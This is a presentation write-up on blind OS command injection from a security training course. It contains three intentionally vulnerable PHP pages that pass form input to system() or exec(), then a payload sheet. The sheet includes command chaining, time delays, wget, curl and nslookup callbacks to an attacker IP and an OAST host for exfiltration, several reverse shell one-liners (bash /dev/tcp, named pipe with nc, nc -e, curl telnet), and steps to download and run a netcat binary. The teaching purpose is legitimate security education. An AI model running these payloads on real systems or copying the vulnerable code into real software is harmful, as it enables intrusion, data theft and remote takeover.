# 🛡️ Blind OS Command Injection - Presentation Overview

## 📋 Table of Contents

### 1. **Introduction to Blind OS Command Injection**

- **File:** `os-command-injection-blind.php`
- Demonstrates vulnerable code patterns
- HTML form with PHP backend processing

---

## 💻 Code Examples

### **Example 1: os-command-injection-blind.php**

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Blind OS Command Injection</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #0f172a;
            color: #e5e7eb;
            max-width: 800px;
            margin: 40px auto;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.6);
        }

        h1 {
            color: #38bdf8;
            text-align: center;
            border-bottom: 3px solid #22c55e;
            padding-bottom: 10px;
        }

        form {
            margin-top: 25px;
            text-align: center;
        }

        input[type="text"] {
            padding: 12px;
            width: 65%;
            font-size: 16px;
            border-radius: 6px;
            border: 1px solid #444;
            background: #020617;
            color: #fff;
        }

        input[type="submit"] {
            margin-top: 15px;
            padding: 12px 30px;
            font-size: 16px;
            background-color: #22c55e;
            color: black;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }

        input[type="submit"]:hover {
            background-color: #16a34a;
        }

        pre {
            background-color: #020617;
            color: #22c55e;
            padding: 15px;
            border-radius: 6px;
            margin-top: 25px;
            font-family: Consolas, monospace;
            font-size: 14px;
            overflow-x: auto;
        }

        .info {
            margin-top: 25px;
            color: #93c5fd;
            font-size: 14px;
        }
    </style>
</head>

<body>

<h1>Blind OS Command Injection Example</h1>

<form method="POST">
    <label>Enter IP Address:</label><br><br>
    <input type="text" name="ipadd" placeholder="127.0.0.1" required>
    <br><br>
    <input type="submit" name="ping" value="Ping">
</form>

<pre>
<?php
if (isset($_POST['ipadd'])) {

    /*
     * ❌ Vulnerable Code
     * User input is directly passed to shell command
     * Output is hidden → Blind Command Injection
     */

    $cmd = "ping -c 4 " . $_POST['ipadd'] . " > /dev/null";
    system($cmd);
}
?>
</pre>

<div class="info">
    <b>Explanation:</b>
    <ul>
        <li>This page takes an IP address from user input.</li>
        <li>The input is directly concatenated into a system command.</li>
        <li>No validation or escaping is used.</li>
        <li>Output is redirected to <code>/dev/null</code>, making it a <b>Blind Command Injection</b>.</li>
        <li>Attackers can verify execution using delays, DNS callbacks, etc.</li>
    </ul>
</div>

</body>
</html>

```

---

### **Example 2: os-command-injection-blind-2.php**

```php
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OS Command Injection Blind</title>
</head>
<body>

<h1>OS Command Injection Blind</h1>

<form action="os-command-injection-blind-2.php" method="POST">
    IP Add:<input type="text" name="ipadd"><br />
    <input type="submit" name="ping" value="ping">
</form>

</body>
</html>

<?php

if (isset($_POST['ipadd'])) {
    
    // Vulnerable code: user input directly concatenated to the shell command without validation or escaping
    $cmd = "ping -c 4 " . $_POST['ipadd'] . " > /dev/null";
    
    exec($cmd);
    
}

?>

<pre>

</body>
</html>
```

**⚠️ Key Issues:**

- Direct concatenation of user input
- No input validation or sanitization
- Command execution without output capture

---

### **Example 3: os-command-injection-blind-3.php**

```php
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>OS Command Injection</title>
</head>
<body>

<h1>OS Command Injection</h1>

<form action="os-command-injection-blind-3.php" method="POST">
    <label for="cars">Run OS Command:</label>
    <select name="cmd" id="cmd">
        <option value="date">Date</option>
        <option value="free -h">Free</option>
        <option value="uptime">Uptime</option>
    </select>
    <br><br>
    <input type="submit" name="run" value="run">
</form>

<?php

if (isset($_POST['run'])) {
    
    $cmd = $_POST['cmd'];
    
    exec($cmd);
    
}

?>

</body>
</html>
```

---

## 🔐 Security Notes

### **Detection Challenges:**

> ⚠️ For blind injections, attackers may infer successful execution through:
> 
> - Timing delays
> - Side effects
> - Out-of-band interactions
> 
> So monitoring and detection are crucial.

### **Mitigation Recommendations:**

> 💡 When shell commands are unavoidable, limit privileges of the execution environment to reduce potential damage.
> 
> 💡 Ideally, avoid using shell commands; use language-native APIs whenever possible.

---

## 🎯 Payload Examples

### **Basic Command Chaining and System Info**

```bash
8.8.8.8;id;uname
```

- Pings Google DNS (8.8.8.8)
- Runs `id` to reveal current user info
- Runs `uname` to disclose system kernel info
- `;` separates commands, enabling chaining

---

### **Repetition to Confirm Injection**

```bash
8.8.8.8;id;id
```

- Runs `id` twice to confirm consistent command execution

---

### **Internal Network Reconnaissance**

```bash
127.0.0.1; ping -c 2 192.168.1.7
```

- Pings localhost
- Executes ping to an internal IP, probing internal network connectivity

---

### **Out-of-Band Interaction for Detection**

```bash
127.0.0.1; wget http://hxisarbga3g9hdmg07l5iqscu3Buoxcm.oastify.com
```

- Downloads or triggers a request from the victim to a controlled OAST server
- Used to verify injection via external callback

---

### **Network Sniffing Utilities (Manual Commands)**

```bash
tcpdump -i eth0 icmp
tcpdump -i eth0 -n icmp
tcpdump -i eth0 udp port 53
tcpdump -i eth0 -n udp port 53
```

- Network traffic monitoring on ICMP and DNS (UDP 53) protocols
- Useful for intercepting sensitive network data

---

### **Delay Injection for Blind Detection**

```bash
;sleep 60
```

- Introduces a 60-second delay
- Time-based technique to confirm command execution silently

---

## 🚀 Payload Hosting/Server Setup

### **Simple HTTP Server:**

```bash
python2.7 -m SimpleHTTPServer 80
python -m http.server 80
```

- Hosts a simple HTTP server
- Useful for hosting malicious payloads for later retrieval

---

### **Out-of-Band Data Exfiltration:**

```bash
; wget http://192.168.1.7
; curl http://192.168.1.7
```

- Forces victim server to make requests to attacker-controlled IP
- Confirms injection and can be used to exfiltrate data

---

### **DNS Lookup Manipulation:**

```bash
; nslookup abc123.com 192.168.1.7
```

- Performs DNS query using a custom DNS server
- Facilitates data exfiltration using DNS queries

---

## 📝 Summary

**Attackers combine these payloads to:**

- ✅ Execute system-level commands by chaining payloads
- ✅ Reconfirm access via repeated commands
- ✅ Explore internal network reachability

---

## 🔄 Reverse Shell Techniques

### **1. Create Test File**

```bash
touch 123.txt
```

- Creates an empty file named `123.txt` on the system
- Often used as a marker to prove the attacker gained write access

---

### **2. Write base64 String to File**

```bash
echo 'c2FjaGlud3lnbWE=' | c2FjaGlud3lnbWE=.txt
```

- Writes the base64-encoded string `c2FjaGlud3lnbWE=` (which decodes to "sachinwyqma") into a file
- Used for testing write access or covert data transfer

---

### **3. Bash Reverse Shell One-Liners**

#### **Option 1:**

```bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.8/443 0>&1'
```

#### **Option 2:**

```bash
/bin/bash -c 'sh -i >& /dev/tcp/192.168.1.8/443 0>&1'
```

#### **Option 3:**

```bash
bash -i >& /dev/tcp/192.168.1.8/443 0>&1
```

#### **Option 4:**

```bash
/bin/bash -i >& /dev/tcp/192.168.1.8/443 0>&1
```

**💡 Explanation:**

- Opens an interactive shell (`bash` or `sh`) on the victim which connects back to the attacker at IP `192.168.1.8` on port 443
- Redirects input/output over TCP, allowing remote command execution

---

### **4. Named Pipe Reverse Shell**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.8 443 >/tmp/f
```

**📌 Breakdown:**

- Creates a named pipe `/tmp/f`
- Pipes input/output through the pipe, creating an interactive shell through netcat connection to attacker on port 443
- Used when direct reverse shells are restricted

---

### **5. Netcat Reverse Shell**

```bash
nc 192.168.1.7 443 -e /bin/bash
```

**🔹 Details:**

- Uses netcat (`nc`) to connect to attacker on port 443 and execute `/bin/bash`
- Simple and effective reverse shell, common in pentesting

---

### **6. Curl-based Reverse Shell**

#### **Single Line:**

```bash
C='curl -Ns telnet://192.168.1.7:443'; $C </dev/null 2>&1 | /bin/bash 2>&1 | $C >/dev/null
```

#### **Multi-line:**

```bash
C='curl -Ns telnet://192.168.1.7:443'
$C </dev/null 2>&1 | /bin/bash 2>&1 | $C >/dev/null
```

**🔧 How it works:**

- Uses `curl` to initiate a TCP connection in a way similar to telnet
- Pipes shell input/output through this connection for remote control
- Bypasses some firewall restrictions that allow HTTP traffic

---

### **7. Download, Prepare, and Run Netcat Binary**

```bash
wget http://192.168.1.7/nc -O /tmp/nc
ls -lh /tmp/nc
chmod -v 777 /tmp/nc
/tmp/nc -e /bin/bash 192.168.1.7 443
```

**📥 Process:**

1. Downloads a custom Netcat binary from the attacker
2. Confirms file presence and permission
3. Grants execution permission
4. Executes it to connect back to attacker for shell
5. Useful if native `nc` is unavailable or restricted

---

## 🎯 Key Takeaways

|Technique|Purpose|
|---|---|
|**Command Chaining**|Execute multiple commands in sequence|
|**Time-based Detection**|Confirm blind injection via delays|
|**Out-of-band**|Verify injection through external callbacks|
|**Reverse Shells**|Establish persistent remote access|
|**Data Exfiltration**|Extract sensitive information via DNS/HTTP|

---

**📚 Presenter:** Tanishq Sharma  
**🏢 Organization:** Armour Infosec  
**📅 Date:** September 4, 2025  
**⏰ Time:** 16:20 - 17:04

---

_⚠️ This material is for educational and authorized security testing purposes only._